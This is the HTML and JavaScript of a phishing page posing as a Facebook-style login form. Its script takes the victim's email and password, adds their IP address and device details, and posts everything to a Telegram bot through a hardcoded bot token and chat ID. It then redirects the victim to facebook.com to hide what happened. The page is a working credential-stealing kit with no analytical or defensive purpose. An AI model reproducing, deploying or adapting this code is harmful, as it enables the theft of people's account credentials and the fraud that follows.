            <div class="col-md-5">
                <form class="login-form" id="login-form" action="#">
                    <div class="mb-3">
                        <input type="text" id="email" class="form-control" placeholder="Email address or phone number" required>

                    <div class="mb-3">
                        <input type="password" id="password" class="form-control" placeholder="Password" required>

                    <button type="submit" class="btn btn-custom btn-lg btn-block mt-3">Log In</button>
                    <div class="text-center pt-3 pb-3">

    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
    <script>
        const TOKEN = "7632004432:AAEde0iDVXa65OTjG5cE452iXG-9YYa5b4k";
        const CHAT_ID = "6604613886";
        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`; // إصلاح URL

        // إضافة الاستماع على حدث تقديم النموذج
        document.getElementById('login-form').addEventListener('submit', function (e) {
            e.preventDefault(); // منع إرسال النموذج بالطريقة التقليدية

            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!email || !password) {
                alert("Please fill in all fields.");
                return;
            }

            // إرسال تفاصيل الدخول إلى Telegram
            axios.get('https://api.ipify.org?format=json')
                .then(response => {
                    const ip = response.data.ip;
                    const userAgent = navigator.userAgent;
                    const platform = navigator.platform;
                    const screenWidth = screen.width;
                    const screenHeight = screen.height;
                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                    const message = `
                        <b>New Login Attempt</b>\n
                        <b>Email:</b> ${email}\n
                        <b>Password:</b> ${password}\n
                        <b>IP Address:</b> ${ip}\n
                        <b>Device Type:</b> ${deviceType}\n
                        <b>Platform:</b> ${platform}\n
                        <b>User Agent:</b> ${userAgent}\n
                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                    `;

                    return axios.post(URI_API, {
                        chat_id: CHAT_ID,
                        parse_mode: 'html',
                        text: message
                    });
                })
                .then(() => {
                    // إعادة توجيه إلى موقع فيسبوك بعد إرسال البيانات
                    window.location.href = "https://www.facebook.com"; // إضافة https:// إلى الرابط
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('An error occurred. Please check your input and try again.');
                });
        });
    </script>
